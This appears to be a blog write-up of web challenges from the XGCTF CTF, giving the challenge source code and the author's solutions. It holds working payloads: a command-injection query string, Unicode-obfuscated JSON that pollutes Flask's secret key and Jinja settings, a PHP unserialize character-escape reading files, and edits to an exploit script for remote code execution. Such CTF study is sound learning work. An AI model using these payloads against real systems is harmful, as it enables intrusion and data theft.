---
title: XGCTF西瓜杯
date: 2026-03-15 14:51:08
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/image-20260316204156656.png
categories: CTF
---

## CodeInject

```php
<?php

#Author: h1xa

error_reporting(0);
show_source(__FILE__);

eval("var_dump((Object)$_POST[1]);");
```

尝试闭合注入

![image-20260315145236861](https://gitee.com/bobrocket/img/raw/master/image-20260315145236861.png)

## tpdoor

第一次做ThinkPHP，先用ai分析一下源码

```php
namespace app\controller;
use app\BaseController;
use think\facade\Db;

class Index extends BaseController
{
    // 定义了这个控制器使用的中间件
    protected $middleware = [
        'think\middleware\AllowCrossDomain', // 允许跨域
        'think\middleware\CheckRequestCache', // 【关键点】检查请求缓存
        'think\middleware\LoadLangPack',     // 加载语言包
        'think\middleware\SessionInit'       // 初始化 Session
    ];
    public function index($isCache = false , $cacheTime = 3600)
	{
    	// 如果 $isCache 为真（用户可控）
    	if($isCache == true){
        // 1. 读取现有的路由配置文件
        	$config = require  __DIR__.'/../../config/route.php';
        
        // 2. 【漏洞点】将用户传入的 $isCache 直接赋值给配置数组
        	$config['request_cache_key'] = $isCache;
        
        // 3. 处理缓存时间（做了 intval 过滤，相对安全）
        	$config['request_cache_expire'] = intval($cacheTime);
        
        // 4. 重置例外列表
        	$config['request_cache_except'] = [];
        
        // 5. 【核心漏洞】将修改后的配置数组写回文件
        // var_export 会将数组转换为 PHP 代码字符串
        	file_put_contents(
            	__DIR__.'/../../config/route.php', 
            	'<?php return '. var_export($config, true). ';'
       	 );
        
        	return 'cache is enabled';
    	}else{
        	return 'Welcome ,cache is disabled';
    }
}
```

这里我们可控的是isCache和cacheTime（控制缓存时间），那么关键的漏洞点就是request_cache_key可控

下面我们找到框架源码的CheckRequestCache.php

![image-20260316150632822](https://gitee.com/bobrocket/img/raw/master/image-20260316150632822.png)

于是

```
/index.php?isCache=cat /000f1ag.txt|system&cacheTime=1
```

## easy_polluted

```python
from flask import Flask, session, redirect, url_for,request,render_template
import os
import hashlib
import json
import re
def generate_random_md5():
    random_string = os.urandom(16)
    md5_hash = hashlib.md5(random_string)

    return md5_hash.hexdigest()
def filter(user_input):
    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']
    for pattern in blacklisted_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True
    return False
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


app = Flask(__name__)
app.secret_key = generate_random_md5()

class evil():
    def __init__(self):
        pass

@app.route('/',methods=['POST'])
def index():
    username = request.form.get('username')
    password = request.form.get('password')
    session["username"] = username
    session["password"] = password
    Evil = evil()
    if request.data:
        if filter(str(request.data)):
            return "NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"
        else:
            merge(json.loads(request.data), Evil)
            return "MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"
    return render_template("index.html")

@app.route('/admin',methods=['POST', 'GET'])
def templates():
    username = session.get("username", None)
    password = session.get("password", None)
    if username and password:
        if username == "adminer" and password == app.secret_key:
            return render_template("flag.html", flag=open("/flag", "rt").read())
        else:
            return "Unauthorized"
    else:
        return f'Hello,  This is the POLLUTED page.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

```

这里我们需要污染`app.secret_key`，由于它进行了`json.loads`，所以过滤可以用Unicode编码绕过

```
{ "__init__" : { "__globals__" : { "app" : { "secret_key" :"123"} } } }
```

```
{
 "\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f" : {
 "\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f" : {
 "\u0061\u0070\u0070" : {
 "\u0073\u0065\u0063\u0072\u0065\u0074\u005f\u006b\u0065\u0079" :"123"
 }
 }
 }
}
```

在/admin路由通过session验证用户名和密码，所以我们在/路由下post传参username和password，在响应头获取session

![image-20260316170133043](https://gitee.com/bobrocket/img/raw/master/image-20260316170133043.png)

进到/admin路由发现

![image-20260316170201881](https://gitee.com/bobrocket/img/raw/master/image-20260316170201881.png)

看来还要污染一下jinja语法标识符

```
{
    "\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f" : {
        "\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f" : {
            "\u0061\u0070\u0070" : {
                    "\u006a\u0069\u006e\u006a\u0061\u005f\u0065\u006e\u0076" :{
"\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0073\u0074\u0061\u0072\u0074\u005f\u0073\u0074\u0072\u0069\u006e\u0067" : "[#","\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0065\u006e\u0064\u005f\u0073\u0074\u0072\u0069\u006e\u0067":"#]"
}        
            }
        }
    }
}
```

这样就出来flag了

### 非预期解

直接污染静态目录

## Ezzz_php

```php
<?php 
highlight_file(__FILE__);
error_reporting(0);
function substrstr($data)
{
    $start = mb_strpos($data, "[");
    $end = mb_strpos($data, "]");
    return mb_substr($data, $start + 1, $end - 1 - $start);
}
class read_file{
    public $start;
    public $filename="/etc/passwd";
    public function __construct($start){
        $this->start=$start;
    }
    public function __destruct(){
        if($this->start == "gxngxngxn"){
           echo 'What you are reading is:'.file_get_contents($this->filename);
        }
    }
}
if(isset($_GET['start'])){
    $readfile = new read_file($_GET['start']);
    $read=isset($_GET['read'])?$_GET['read']:"I_want_to_Read_flag";
    if(preg_match("/\[|\]/i", $_GET['read'])){
        die("NONONO!!!");
    }
    $ctf = substrstr($read."[".serialize($readfile)."]");
    unserialize($ctf);
}else{
    echo "Start_Funny_CTF!!!";
}
```

字符逃逸，本地调试一下就出来了

```php
<?php
function substrstr($data)
{
    $start = mb_strpos($data, "[");
    $end = mb_strpos($data, "]");
    return mb_substr($data, $start + 1, $end - 1 - $start);
}
class read_file{
    public $start;
    public $filename="/etc/passwd";
    public function __construct($start){
        $this->start=$start;
    }
    public function __destruct(){
        if($this->start == "gxngxngxn"){
            echo 'What you are reading is:'.file_get_contents($this->filename);
        }
    }
}
$payload='O:9:"read_file":2:{s:5:"start";s:9:"gxngxngxn";s:8:"filename";s:15:"/proc/self/maps";}';
$readfile = new read_file($payload);
echo serialize($readfile);
$read=urldecode("%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa");
$ctf = substrstr($read."[".serialize($readfile)."]");
echo "\n";
echo $ctf;
echo "\n";
echo urlencode($payload);
```

但是并不是/flag，所以还是要打cnext，这里好好研究了一下全自动脚本

我们需要修改的是这两个函数

```php
def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        return self.session.post(self.url, data={"file": path})
        
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        data = response.re.search(b"File contents: (.*)", flags=re.S).group(1)
        return base64.decode(data)
```

也就是发送请求和正则匹配，修改如下

```python
def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        payload = 'O:9:"read_file":2:{s:5:"start";s:9:"gxngxngxn";s:8:"filename";s:' + str(len(path)) + ':"' + path + '";}'
        payload = payload.replace("+","%2b")#不明白为啥要有这个，但是去了就不好使
        gao = "%f0%9f%9fa" * (35+len(str(len(payload))))
        url = self.url+f"?start={payload}&read={gao}"
        return self.session.get(url)

    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        data = response.re.search(b"What you are reading is:(.*)", flags=re.S).group(1)
        return base64.decode(data)
```

